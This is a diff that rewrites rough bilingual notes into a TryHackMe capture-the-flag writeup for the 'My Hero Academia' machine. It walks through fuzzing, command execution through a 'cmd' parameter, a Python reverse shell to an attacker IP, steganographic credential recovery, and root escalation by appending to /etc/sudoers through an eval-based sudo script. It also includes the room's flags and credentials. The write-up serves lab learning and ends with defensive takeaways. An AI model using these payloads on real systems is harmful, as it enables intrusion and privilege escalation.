@@ -1,293 +1,360 @@
-First i will do a nmap scan to target 
+# My Hero Academia — TryHackMe Writeup
+> **Platform:** TryHackMe | **Difficulty:** Medium | **Category:** Web, Steganography, Privilege Escalation
 
-[davidoberst@archlinux ~]$ sudo nmap -Pn -sV -O 10.65.145.2
+---
 
-we have : 
+## Overview
+
+This machine exposes a web server with a hidden PHP file vulnerable to Remote Code Execution via an unprotected `cmd` parameter. Output is Base64-encoded, obscuring the RCE at first glance. After gaining a foothold as `www-data`, credentials are recovered through a hidden directory and steganographic data embedded in a JPEG image. Final privilege escalation abuses a sudo script that passes user input directly to `eval`, with an incomplete blocklist that fails to filter the `>>` redirection operator — allowing a write to `/etc/sudoers` as root.
+
+**Attack Chain:**
+```
+Nmap → Directory fuzzing → Parameter fuzzing → RCE (Base64) 
+→ Reverse shell → Hidden passphrase → Steganography → SSH as deku 
+→ eval injection → root
+```
+
+---
+
+## Step 1 — Reconnaissance
+
+```bash
+sudo nmap -Pn -sV -O 10.65.145.2
+```
+
+```
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
+```
 
-i open the webpage 
-http://10.65.184.34/ 
-im gonna do fuzzing
-[davidoberst@archlinux Web-Content]$ gobuster dir -u http://10.65.184.34/ -w common.txt
+Two open ports. SSH requires credentials, so the web server on port 80 is the entry point.
 
-no other items founded 
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.64.132.198
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                big.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8.2
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-.htpasswd            (Status: 403) [Size: 278]
-.htaccess            (Status: 403) [Size: 278]
-assets               (Status: 301) [Size: 315] [--> http://10.64.132.198/assets/]
-server-status        (Status: 403) [Size: 278]
-Progress: 20481 / 20481 (100.00%)
-===============================================================
-Finished
-===============================================================
-al entrar a assets sale una pagina en blanco,, as ique hare fuzzing a la pagina desde assets, y encontre index.php 
+---
 
-.hta                 (Status: 403) [Size: 278]
-.htaccess            (Status: 403) [Size: 278]
-.htpasswd            (Status: 403) [Size: 278]
-images               (Status: 301) [Size: 322] [--> http://10.64.132.198/assets/images/]
-index.php            (Status: 200) [Size: 0]
+## Step 2 — Directory Fuzzing
 
-luego de encontrar index .php en la sigueinte url : 
-http://10.64.132.198/assets/index.php muestra una pagina en blanco, asi que ahora intentare hacer un fuzzing de paraemtros : 
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:              http://10.64.132.198/assets/index.php?FUZZ=id
-[+] Method:           GET
-[+] Threads:          10
-[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
-[+] Exclude Length:   0
-[+] User Agent:       gobuster/3.8.2
-[+] Timeout:          10s
-===============================================================
-Starting gobuster in fuzzing mode
-===============================================================
-[Status=200] [Length=72] [Word=cmd] http://10.64.132.198/assets/index.php?cmd=id
-Progress: 6453 / 6453 (100.00%)
+Visiting the root of the web server returns a standard page with no obvious attack surface. Running Gobuster against it:
 
-al poner el parametero : 
-http://10.64.132.198/assets/index.php?cmd=id
-el servidor rsponde con un mensaje esn texto plano : 
+```bash
+gobuster dir -u http://10.64.132.198/ -w big.txt
+```
+
+```
+.htpasswd     (Status: 403)
+.htaccess     (Status: 403)
+assets        (Status: 301) [--> http://10.64.132.198/assets/]
+server-status (Status: 403)
+```
+
+The `/assets/` directory returns a blank page. Fuzzing it further reveals a PHP file:
+
+```bash
+gobuster dir -u http://10.64.132.198/assets/ -w big.txt
+```
+
+```
+images    (Status: 301) [--> http://10.64.132.198/assets/images/]
+index.php (Status: 200) [Size: 0]
+```
+
+`/assets/index.php` also returns a blank page — likely waiting for a parameter.
+
+---
+
+## Step 3 — Parameter Fuzzing → RCE Discovery
+
+Fuzzing for GET parameters using a common parameter wordlist:
+
+```bash
+gobuster fuzz -u http://10.64.132.198/assets/index.php?FUZZ=id \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  --exclude-length 0
+```
+
+```
+[Status=200] [Length=72] [Word=cmd] 
+→ http://10.64.132.198/assets/index.php?cmd=id
+```
+
+The `cmd` parameter triggers a response. However, the output is not plaintext — it is Base64-encoded:
+
+```
 dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
-es base64, al decodficiarlo muestra : 
+```
+
+Decoding it:
+
+```bash
+echo "dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK" | base64 -d
+```
+
+```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-note que al poner cualquier comando responde siempre con base 64, probe con ls y responde con : 
-images
-index.php
-styles.css
+```
 
-intentare poner una reverse shell : 
+Remote code execution confirmed as `www-data`. Every command response is Base64-encoded.
 
-listener : nc -lvnp 9999
-payload : python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.138.111",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+---
 
+## Step 4 — Reverse Shell
 
-recibi una respuestaen el listener : 
+Setting up the listener on the attack machine:
 
-[davidoberst@archlinux ~]$ curl -g 'http://10.66.169.120/assets/index.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22192.168.138.111%22%2C9999))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)%27'
+```bash
+nc -lvnp 9999
+```
 
+Sending the reverse shell payload via URL-encoded curl:
 
+```bash
+curl -g 'http://10.66.169.120/assets/index.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22ATTACKER_IP%22%2C9999))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)%27'
+```
 
-[davidoberst@archlinux ~]$ nc -lvnp 9999
-Listening on 0.0.0.0 9999
+The raw payload before URL encoding:
+
+```python
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+```
+
+Shell received:
+
+```
 Connection received on 10.66.169.120 47292
-$ ls
-ls
-images  index.php  styles.css
-$ whoami 
-whoami
+$ whoami
 www-data
-$ 
+```
 
+---
 
-encontre una carpeta llamada HIdden Content 
+## Step 5 — Hidden Directory → Passphrase
 
+Exploring the web root reveals a directory named `Hidden_Content`:
+
+```bash
+$ ls /var/www/html
 Hidden_Content  html
-$ cd Hidden_COntent
-cd Hidden_COntent
-sh: 11: cd: can't cd to Hidden_COntent
-$ cd Hidden_Content        
-cd Hidden_Content
-$ ls
-ls
+
+$ ls /var/www/html/Hidden_Content
 passphrase.txt
-$ cat passphrase.txt
-cat passphrase.txt
+
+$ cat /var/www/html/Hidden_Content/passphrase.txt
 QWxsbWlnaHRGb3JFdmVyISEhCg==
-$     
+```
 
-al decodificar el base64 dice :
+Decoding:
+
+```bash
+echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d
+```
+
+```
 AllmightForEver!!!
+```
 
-luego de buscar en los directorios, encontre la bandera, pero estaba bloqueada :
+Passphrase saved for later use.
 
-$ cd home
-cd home
-$ ls
-ls
-deku  ubuntu
-$ cd deku
-cd deku
-$ ls
-ls
-user.txt
-$ cat user.txt
-cat user.txt
+---
+
+## Step 6 — Flag Blocked, Pivoting to Steganography
+
+The user flag exists but is inaccessible as `www-data`:
+
+```bash
+$ cat /home/deku/user.txt
 cat: user.txt: Permission denied
+```
 
-de todas formas, encontre unas imagenes en una ruta, intentare usar estaganografia para ver si contienen algo dentro de ellas. 
+Two images are found in the web assets:
 
-/var/www/html/assets
-$ ls
-ls
-images  index.php  styles.css
-$ cd images
-cd images
-$ ls
-ls
+```bash
+$ ls /var/www/html/assets/images/
 oneforall.jpg  yuei.jpg
-$ 
+```
 
-Levantare un servidor en python3 en la maquina victima para omar las imagenes desde mi terminal 
+Serving them over HTTP from the victim machine:
 
+```bash
 $ python3 -m http.server 8000
-python3 -m http.server 8000
+```
 
+Downloading on the attack machine:
 
-ahora las descargo 
+```bash
+wget http://<TARGET_IP>:8000/oneforall.jpg
+wget http://<TARGET_IP>:8000/yuei.jpg
+```
 
+`oneforall.jpg` has corrupt magic bytes. Repairing with `magicbytes.py`:
 
-[davidoberst@archlinux ~]$ wget http://10.67.189.74:8000/oneforall.jpg
---2026-06-19 01:31:50--  http://10.67.189.74:8000/oneforall.jpg
-Connecting to 10.67.189.74:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 98264 (96K) [image/jpeg]
-Saving to: ‘oneforall.jpg’
+```bash
+python3 magicbytes.py -i oneforall.jpg -m jpg
+# → Magic bytes has been changed of oneforall.jpg as jpg
+```
 
-oneforall.jpg               100%[=========================================>]  95.96K   450KB/s    in 0.2s    
+Extracting hidden data with `steghide`, using the passphrase found earlier:
 
-2026-06-19 01:31:51 (450 KB/s) - ‘oneforall.jpg’ saved [98264/98264]
+```bash
+steghide extract -sf oneforall.jpg
+# Enter passphrase: AllmightForEver!!!
+# → wrote extracted data to "creds.txt"
 
-[davidoberst@archlinux ~]$ wget http://10.67.189.74:8000/yuei.jpg
---2026-06-19 01:31:57--  http://10.67.189.74:8000/yuei.jpg
-Connecting to 10.67.189.74:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 237170 (232K) [image/jpeg]
-Saving to: ‘yuei.jpg’
+cat creds.txt
+```
 
-yuei.jpg                    100%[=========================================>] 231.61K   823KB/s    in 0.3s    
-
-2026-06-19 01:31:57 (823 KB/s) - ‘yuei.jpg’ saved [237170/237170]
-
-the file oneforall.png is corrupted, so were going to fix it whit a tool "MagicBytes"
-
-
-[davidoberst@archlinux ~]$ python3 magicbytes.py -i oneforall.jpg -m jpg
-Magic bytes has been changed of oneforall.jpg as jpg
-the image was repaired, so now i will use steghide to see if the file has embedded data
-
-[davidoberst@archlinux ~]$ steghide extract -sf oneforall.jpg
-Enter passphrase: 
-wrote extracted data to "creds.txt".
-[davidoberst@archlinux ~]$ cat creds.txt
-Hi Deku, this is the only way I've found to give yosu your account credentials, as soon as you have them, delete this file:
+```
+Hi Deku, this is the only way I've found to give you your account credentials,
+as soon as you have them, delete this file:
 
 deku:One?For?All_!!one1/A
-[davidoberst@archlinux ~]$ 
+```
 
-now i will logon on ssh whit the new credentials
+---
 
-[davidoberst@archlinux ~]$ ssh deku@10.65.163.21
+## Step 7 — SSH as `deku` → User Flag
 
-las credencilae me permitieron pasar exitosamente :
+```bash
+ssh deku@<TARGET_IP>
+```
 
-deku@ip-10-65-163-21:~$ 
-
-
-ahora intenrae abrir de nuevo el archivo que antes no me permitia 
-
-deku@ip-10-65-163-21:~$ ls
-user.txt
+```bash
 deku@ip-10-65-163-21:~$ cat user.txt
 THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
-deku@ip-10-65-163-21:~$ 
+```
 
-tenemos la primera bandera. ahora busquemos que enocntramos en el suaurio home/deku
+**User flag captured.**
 
-buscando, encontre un script sh 
+---
 
-deku@ip-10-65-172-147:/$ cd opt
-deku@ip-10-65-172-147:/opt$ ls -a
-.  ..  NewComponent
-deku@ip-10-65-172-147:/opt$ cd NewComponent
-deku@ip-10-65-172-147:/opt/NewComponent$ ls
-feedback.sh
-deku@ip-10-65-172-147:/opt/NewComponent$ ls -a
-.  ..  feedback.sh
-deku@ip-10-65-172-147:/opt/NewComponent$ cat deedback.sh
-cat: deedback.sh: No such file or directory
-deku@ip-10-65-172-147:/opt/NewComponent$ cat feedback.sh
+## Step 8 — Privilege Escalation via `eval` Injection in sudo Script
+
+Checking sudo permissions:
+
+```bash
+sudo -l
+```
+
+```
+User deku may run the following commands:
+    (ALL) /opt/NewComponent/feedback.sh
+```
+
+Inspecting the script:
+
+```bash
+cat /opt/NewComponent/feedback.sh
+```
+
+```bash
 #!/bin/bash
-
-echo "Hello, Welcome to the Report Form       "
-echo "This is a way to report various problems"
-echo "    Developed by                        "
-echo "        The Technical Department of U.A."
-
 echo "Enter your feedback:"
 read feedback
 
-
-if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
+if [[ "$feedback" != *"\`"* && "$feedback" != *")"*  && \
+      "$feedback" != *"\$("* && "$feedback" != *"|"* && \
+      "$feedback" != *"&"* && "$feedback" != *";"*  && \
+      "$feedback" != *"?"* && "$feedback" != *"!"*  && \
+      "$feedback" != *"\\"* ]]; then
     echo "It is This:"
     eval "echo $feedback"
-
     echo "$feedback" >> /var/log/feedback.txt
-    echo "Feedback successfully saved."
 else
-    echo "Invalid input. Please provide a valid input." 
+    echo "Invalid input."
 fi
+```
 
+### Vulnerability Analysis
 
-desglosando el script vemos que hay un eval, con eso podemos ejecutar comandos a traves de payloads, sin embargo el desarrollador intenta evitar la ejecucion e inyeccion de comandos a traves de un condicional con parametros no permitidios, aun asi olvido poner una validacion de salto de linea, intentaremos implementar un payload con un salto de linea para ingresar a root
+The script runs as root via sudo and passes user input directly into `eval "echo $feedback"`. A blocklist attempts to prevent injection by filtering:
 
+| Blocked | Character |
+|---------|-----------|
+| `` ` `` | Backtick |
+| `)` | Closes subshell |
+| `$(` | Command substitution |
+| `\|` | Pipe |
+| `&` | Background/AND |
+| `;` | Command separator |
+| `?` | Glob / shell special |
+| `!` | History expansion |
+| `\` | Escape character |
 
-PAYLOAD : deku ALL=NOPASSWD: ALL >> /etc/sudoers
+**Critical omission:** the `>` and `>>` redirection operators are not blocked.
 
+### How the Exploit Works
 
-deku@ip-10-65-172-147:/opt/NewComponent$ sudo ./feedback.sh
-Hello, Welcome to the Report Form       
-This is a way to report various problems
-    Developed by                        
-        The Technical Department of U.A.
+When the input is:
+```
+deku ALL=NOPASSWD: ALL >> /etc/sudoers
+```
+
+The script executes:
+```bash
+eval "echo deku ALL=NOPASSWD: ALL >> /etc/sudoers"
+```
+
+Since the script runs as root, this appends the sudoers rule to `/etc/sudoers`, granting `deku` unrestricted passwordless sudo access.
+
+### Exploitation
+
+```bash
+sudo /opt/NewComponent/feedback.sh
+```
+
+```
 Enter your feedback:
 deku ALL=NOPASSWD: ALL >> /etc/sudoers
+
 It is This:
 Feedback successfully saved.
-deku@ip-10-65-172-147:/opt/NewComponent$ sudo -l
-Matching Defaults entries for deku on ip-10-65-172-147:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+```
 
+Verifying the new permissions:
+
+```bash
+sudo -l
+```
+
+```
 User deku may run the following commands on ip-10-65-172-147:
     (ALL) /opt/NewComponent/feedback.sh
     (root) NOPASSWD: ALL
-deku@ip-10-65-172-147:/opt/NewComponent$ 
+```
 
+Escalating to root:
 
+```bash
+sudo su
+```
 
-after that we acces to root 
+```bash
+cat /root/root.txt
+```
 
-root@ip-10-65-172-147:/# cd root
-root@ip-10-65-172-147:~# ls
-root.txt  snap
-root@ip-10-65-172-147:~# cat root.txt
-root@myheroacademia:/opt/NewComponent# cat /root/root.txt
-__   __               _               _   _                 _____ _          
-\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
- \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
-  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
-  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
-                                  _    _ 
-             _   _        ___    | |  | |
-            | \ | | ___  /   |   | |__| | ___ _ __  ___
-            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
-            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
-            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 
-
+```
 THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
+```
+
+**Root flag captured.**
+
+---
+
+## Summary of Findings
+
+| Step | Vulnerability | Impact |
+|------|--------------|--------|
+| Initial Access | Unauthenticated RCE via `cmd` parameter in `index.php` | Remote code execution as `www-data` |
+| Credential Leak | Passphrase stored in plaintext in a hidden web directory | Enabled steganography extraction |
+| Lateral Movement | SSH credentials hidden via steganography in JPEG image | SSH access as `deku` |
+| Privilege Escalation | `eval` injection via unfiltered `>>` redirect in privileged sudo script | Full root access |
+
+---
+
+## Key Takeaways
+
+- **Never expose command execution via GET parameters** — a `?cmd=` endpoint with no authentication is a critical RCE vulnerability regardless of output encoding.
+- **Base64 encoding is not security** — it obscures output but does nothing to prevent exploitation.
+- **Sensitive files should not be stored under the web root** — the `Hidden_Content` directory was directly accessible via HTTP.
+- **Steganography can be used to exfiltrate or hide credentials** — always check images found on a server.
+- **Blocklists for shell injection are inherently incomplete** — `eval` with user input is dangerous no matter what characters are filtered. Use allowlists or eliminate `eval` entirely.
+- **`>>` redirection** is a commonly overlooked injection vector that becomes critical when a script runs as root.
